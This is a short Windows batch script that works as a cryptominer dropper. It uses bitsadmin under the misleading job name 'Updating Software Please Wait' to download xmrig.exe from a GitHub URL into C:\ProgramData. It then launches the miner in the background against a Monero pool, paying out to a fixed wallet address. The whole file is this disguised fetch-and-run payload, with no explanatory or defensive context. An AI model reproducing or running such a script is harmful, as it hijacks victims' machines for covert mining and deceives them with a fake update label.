@echo off
bitsadmin /wrap /transfer Updating Software Please Wait /priority high https://github.com/insectia/Arts/raw/master/xmrig.exe C:\ProgramData\xmrig.exe
timeout 1
C:\ProgramData\xmrig.exe -o monerohash.com:3333 -u 46ncqzHBax31tXPzVdrYt2PPotGsHroZK4mToY8HPmckgrKL45471ymjFQsRBMnDardWySx2j5BLPBepnBJ4zoKtHhGpSjp -p x -B -k
pause
